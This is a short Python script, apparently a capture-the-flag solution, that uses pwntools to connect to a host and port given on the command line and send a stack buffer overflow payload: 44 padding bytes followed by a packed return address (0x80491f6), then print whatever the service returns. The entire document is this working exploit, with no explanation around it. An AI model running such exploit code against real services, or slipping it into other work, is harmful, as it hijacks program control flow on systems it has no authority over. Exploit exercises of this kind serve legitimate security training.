from pwn import *
import sys

host, port = sys.argv[1:3]

r = remote(host, port)
r.recvS()
r.sendline(b'A'*44 + p32(0x80491f6))
print(r.recvallS())
r.close()
